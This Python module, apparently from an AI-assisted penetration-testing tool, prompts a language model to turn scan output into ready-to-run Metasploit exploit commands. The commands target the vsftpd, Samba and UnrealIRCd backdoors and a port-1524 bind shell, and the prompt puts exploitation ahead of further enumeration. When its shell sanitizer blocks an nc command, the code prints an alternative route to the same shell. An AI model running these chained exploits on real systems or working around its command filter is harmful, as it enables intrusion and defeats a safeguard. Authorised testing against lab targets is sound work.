"""AI analysis and chaining."""

import json
import re
from rich.console import Console
from rich.live import Live
from rich.spinner import Spinner

from kernox.guards.shell_sanitizer import sanitize
from .output_formatter import OutputFormatter

console = Console()

INTENSITY_FLAG_HINTS = {
    "STEALTH":    (
        "Use only slow, quiet flags. "
        "For nmap: -T0 --scan-delay 1s --max-rate 10. "
        "For ffuf/gobuster: -t 1 -delay 2s. "
        "For hydra: -t 1. "
        "Avoid noisy/aggressive tools entirely."
    ),
    "NORMAL":     "Use default timing. No extra speed or stealth flags.",
    "AGGRESSIVE": (
        "Use fast flags. "
        "For nmap: -T4. "
        "For ffuf: -t 100. "
        "For hydra: -t 16. "
        "For gobuster: -t 50."
    ),
    "FULL":       (
        "Use maximum speed. "
        "For nmap: -T5 --min-rate 5000. "
        "For ffuf: -t 200. "
        "For hydra: -t 64. "
        "For gobuster: -t 100."
    ),
}


def extract_json(text: str) -> dict | None:
    """Extract JSON from AI response."""
    text = text.strip()
    if text.startswith("```"):
        text = "\n".join(
            l for l in text.split("\n") if not l.strip().startswith("```")
        ).strip()
    m = re.search(r"\{.*\}", text, re.DOTALL)
    if not m:
        return None
    try:
        return json.loads(m.group())
    except json.JSONDecodeError:
        return None


class AIAnalyzer:
    def __init__(self, ai_client, state, intensity):
        self._ai = ai_client
        self._state = state
        self._intensity = intensity

    def analyze(self, tool_name: str, target: str, raw_output: str) -> list[dict]:
        """Analyze tool output, display findings, return validated next steps."""
        if not raw_output.strip():
            return []

        preview = raw_output[:5000]  # Increased from 3000 — give more context
        intensity_name = self._intensity.get("name", "NORMAL")
        flag_hint = INTENSITY_FLAG_HINTS.get(intensity_name, INTENSITY_FLAG_HINTS["NORMAL"])

        prompt = (
            f"You are an expert penetration tester conducting a real security assessment.\n"
            f"You MUST perform deep analysis of the tool output below.\n\n"
            f"Tool     : {tool_name}\n"
            f"Target   : {target}\n"
            f"Intensity: {intensity_name}\n"
            f"Timing   : {flag_hint}\n\n"
            f"Output:\n{preview}\n\n"
            f"=== CRITICAL ANALYSIS REQUIREMENTS ===\n\n"
            f"1. VERSION-BASED CVE RESEARCH:\n"
            f"   - For EVERY service with a version number, identify known CVEs.\n"
            f"   - Examples: vsftpd 2.3.4 = CVE-2011-2523 (smiley face backdoor — CRITICAL).\n"
            f"   - UnrealIRCd 3.2.8.1 = CVE-2010-2075 (backdoor — CRITICAL).\n"
            f"   - ProFTPD 1.3.1 = multiple RCE vulnerabilities.\n"
            f"   - Samba 3.x = CVE-2007-2447 (username map script RCE — CRITICAL).\n"
            f"   - OpenSSH 4.7p1 Debian = weak PRNG, predictable keys.\n"
            f"   - MySQL 5.0.51a = authentication bypass.\n"
            f"   - PostgreSQL 8.3.x = multiple known exploits.\n"
            f"   - Apache 2.2.8 = multiple CVEs.\n"
            f"   - Tomcat/Coyote = default creds, manager app.\n"
            f"   - VNC protocol 3.3 = weak auth bypass.\n"
            f"   - DO NOT say 'could allow unauthorized access' — say exactly what CVE and exploit exists.\n\n"
            f"2. RISK ASSESSMENT:\n"
            f"   - If a bind shell is OPEN on port 1524, that is INSTANT ROOT ACCESS — CRITICAL.\n"
            f"   - If a service has a known remote backdoor, that is CRITICAL.\n"
            f"   - If telnet is open, that is CRITICAL (plaintext creds, no encryption).\n"
            f"   - Score realistically: a Metasploitable box is ALWAYS CRITICAL/HIGH risk overall.\n"
            f"   - The summary MUST state the true risk level honestly.\n\n"
            f"3. EXPLOIT COMMANDS:\n"
            f"   - Provide EXACT ready-to-run exploit commands using metasploit or standalone tools.\n"
            f"   - For vsftpd 2.3.4: 'msfconsole -q -x \"use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS {target}; exploit\"'\n"
            f"   - For bindshell on 1524: 'nc {target} 1524' (if shell_sanitizer allows) or 'msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD linux/x86/shell_bind_tcp; set RHOST {target}; set LPORT 1524; exploit\"'\n"
            f"   - For Samba: 'msfconsole -q -x \"use exploit/multi/samba/usermap_script; set RHOST {target}; exploit\"'\n"
            f"   - For UnrealIRCd: 'msfconsole -q -x \"use exploit/unix/irc/unreal_ircd_3281_backdoor; set RHOST {target}; exploit\"'\n\n"
            f"4. CHAINING:\n"
            f"   - After finding a backdoor, the next step should be to EXPLOIT it, not scan something else.\n"
            f"   - Prioritize immediate exploitation over further enumeration when a backdoor exists.\n"
            f"   - Deeper enumeration is only needed if no immediate exploit path is visible.\n\n"
            f"5. OUTPUT FORMAT:\n"
            f"   - Return a single valid JSON object — no markdown fences, no extra text.\n"
            f"   - The 'impact' field must be specific: 'Attacker gains root shell on target system'\n"
            f"     NOT generic: 'may allow unauthorized access'\n\n"
            f'{{\n'
            f'  "summary": "Honest risk summary — mention specific critical vulns found",\n'
            f'  "vulnerabilities": [\n'
            f'    {{\n'
            f'      "name": "CVE-2011-2523 vsftpd 2.3.4 Backdoor",\n'
            f'      "severity": "critical",\n'
            f'      "description": "vsftpd 2.3.4 contains a backdoor triggered by a smiley face in the username on port 21 — CVE-2011-2523",\n'
            f'      "impact": "Remote attacker gains immediate root shell on the target",\n'
            f'      "exploit": "msfconsole -q -x \\"use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS {target}; exploit\\""\n'
            f'    }}\n'
            f'  ],\n'
            f'  "next_steps": [\n'
            f'    {{\n'
            f'      "tool": "shell",\n'
            f'      "args": {{"command": "msfconsole -q -x \\"use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS {target}; exploit\\"", "target": "{target}"}},\n'
            f'      "reason": "Exploit the vsftpd backdoor for immediate root access",\n'
            f'      "priority": 1\n'
            f'    }}\n'
            f'  ]\n'
            f'}}'
        )

        try:
            with Live(Spinner("dots", text="[cyan]Analyzing deeply...[/cyan]"), refresh_per_second=10):
                response = self._ai.chat(
                    messages=[{"role": "user", "content": prompt}],
                    system=(
                        "You are an elite penetration testing AI. You have deep knowledge of every CVE, "
                        "every Metasploit module, and every real exploit technique. "
                        "You NEVER downplay risk. If a service has a known backdoor, you call it CRITICAL. "
                        "If a bind shell is open, you call it CRITICAL. "
                        "You always provide exact exploit commands, not generic suggestions. "
                        "Return valid JSON only. No markdown. No explanation outside the JSON."
                    ),
                    max_tokens=2000,  # Increased for deeper analysis
                )

            data = extract_json(response)
            if not data:
                console.print("[dim]⚠ Analyzer returned no structured data[/dim]")
                return []

            # Show summary
            if data.get("summary"):
                console.print(f"\n[bold cyan]⚡ Analysis:[/bold cyan] {data['summary']}")

            # Display vulnerabilities with proper risk coloring
            for vuln in data.get("vulnerabilities", [])[:10]:  # Show up to 10 vulns
                if vuln.get("name"):
                    # Override severity if it's clearly wrong
                    name_lower = vuln.get("name", "").lower()
                    desc_lower = vuln.get("description", "").lower()
                    impact_lower = vuln.get("impact", "").lower()

                    # Force CRITICAL for known backdoors
                    if any(kw in name_lower + desc_lower + impact_lower for kw in [
                        "backdoor", "bindshell", "bind shell", "root shell",
                        "remote code execution", "rce", "vsftpd 2.3.4",
                        "unrealircd", "samba usermap", "metasploitable root",
                    ]):
                        vuln["severity"] = "critical"

                    OutputFormatter.format_vulnerability(vuln)
                    self._state.add_ai_insight(
                        vulnerability=vuln.get("name"),
                        severity=vuln.get("severity", "info"),
                        tool=tool_name,
                        target=target,
                        explanation=vuln,
                    )

            # Validate next steps through sanitizer
            valid = []
            for step in data.get("next_steps", [])[:5]:  # Show up to 5 next steps
                cmd = step.get("args", {}).get("command", "")
                if cmd:
                    san = sanitize(cmd, None)
                    if san.allowed:
                        valid.append(step)
                    else:
                        console.print(f"[dim]⚠ Suggested command blocked ({san.reason})[/dim]")
                        # Suggest alternative if blocked
                        if "nc" in cmd.lower() and "bindshell" in step.get("reason", "").lower():
                            alt = f"msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD linux/x86/shell_bind_tcp; set RHOST {target}; set LPORT 1524; exploit\""
                            console.print(f"[dim]  → Try instead: {alt}[/dim]")

            return valid

        except Exception as exc:
            console.print(f"[red]✗ Analysis error: {exc}[/red]")
            return []
